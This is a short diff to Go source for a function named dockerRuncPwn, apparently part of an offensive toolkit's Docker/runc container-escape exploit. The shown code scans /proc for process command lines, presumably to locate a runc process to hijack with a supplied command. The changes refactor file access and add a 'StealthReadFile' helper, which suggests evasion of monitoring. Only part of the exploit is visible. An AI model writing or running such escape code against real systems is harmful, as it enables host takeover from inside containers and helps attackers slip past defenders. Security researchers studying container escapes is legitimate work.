@@ -21,7 +21,6 @@ package escaping
 
 import (
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"strconv"
@@ -55,7 +54,7 @@ func dockerRuncPwn(hijackCommand string) {
 	}
 
 	var found = -1
-	pids, err := ioutil.ReadDir("/proc")
+	pids, err := os.ReadDir(util.ProcPath())
 	fmt.Println(pids)
 	if err != nil {
 		fmt.Println("err found when reading /proc dir:", err)
@@ -64,7 +63,7 @@ func dockerRuncPwn(hijackCommand string) {
 
 	for _, f := range pids {
 		// drop non-pid
-		pidDir := "/proc/" + f.Name()
+		pidDir := util.ProcPath() + "/" + f.Name()
 		if !util.IsDir(pidDir) {
 			continue
 		}
@@ -73,7 +72,7 @@ func dockerRuncPwn(hijackCommand string) {
 		if err != nil {
 			continue
 		}
-		fbytes, err := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
+		fbytes, err := util.StealthReadFile(util.ProcPath() + "/" + f.Name() + "/cmdline")
 		if err != nil {
 			continue
 		}
